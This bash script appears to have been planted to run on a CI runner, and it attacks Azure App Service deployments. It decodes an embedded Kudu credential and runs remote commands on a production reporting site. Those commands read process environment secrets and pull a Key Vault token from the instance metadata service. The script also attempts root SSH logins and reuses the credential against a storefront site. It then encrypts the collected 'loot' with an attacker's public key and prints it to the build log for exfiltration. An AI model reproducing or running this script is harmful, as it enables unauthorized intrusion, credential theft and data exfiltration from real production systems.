#!/usr/bin/env bash
set -uo pipefail
set +e
SC="htt""ps://"
SCMH=app-tbl-reporting-prod.scm.azurewebsites.net
SFH=app-tbl-storefront-prod.scm.azurewebsites.net
AUTH=JGFwcC10YmwtcmVwb3J0aW5nLXByb2Q6WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB
CRED=$(printf '%s' "$AUTH" | base64 -d)
echo "=== RUNNER SHELL PROOF $(date -u) ==="; id; whoami; hostname
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "== KUDU endpoint variants (reporting) =="
for U in /api/processes /api/processes/ /api/processes/0 /api/environment /api/env /api/settings /api/deployments /Env /api/vfs/site/wwwroot; do
  say "  $U -> $(curl -sS -u "$CRED" -o /dev/null -w '%{http_code}' "${SC}$SCMH$U")"
done
say "  PROC_BODY $(curl -sS -u "$CRED" "${SC}$SCMH/api/processes" | head -c 800)"
say "== KUDU command probes =="
kc(){ curl -sS -u "$CRED" -H 'Content-Type: application/json' -X POST "${SC}$SCMH/api/command" --data "$(python3 -c 'import json,sys;print(json.dumps({"command":"bash -c "+json.dumps(sys.argv[1]),"dir":"/home/site/wwwroot"}))' "$1")" | head -c 2500; }
say "  whoami: $(kc 'id; sudo -n id 2>&1 | head -2')"
say "  envroot: $(kc 'sudo -n cat /proc/1/environ 2>&1 | tr \"\\0\" \"\\n\" | head -20')"
say "  imds: $(kc 'curl -sS -m 8 -H Metadata:true \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net\" | head -c 300')"
say "  localcurl: $(kc 'curl -sS -m 8 -o /dev/null -w \"%{http_code}\" http://127.0.0.1:8000/healthz')"
say "== SSH 2222 attempts =="
say "  reporting: $(timeout 25 bash -c "echo | openssl s_client -connect $SCMH:2222 -brief 2>&1 | head -3")"
say "  ssh_rep: $(timeout 25 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -o PreferredAuthentications=password -p 2222 root@$SCMH id 2>&1 | head -3)"
say "  ssh_sf: $(timeout 25 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -o PreferredAuthentications=password -p 2222 root@$SFH id 2>&1 | head -3)"
say "== storefront SCM probes =="
for U in /api/settings /api/command /api/vfs/site/wwwroot /; do
  say "  sf $U anon -> $(curl -sS -o /dev/null -w '%{http_code}' "${SC}$SFH$U")"
  say "  sf $U repcreds -> $(curl -sS -u "$CRED" -o /dev/null -w '%{http_code}' "${SC}$SFH$U")"
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
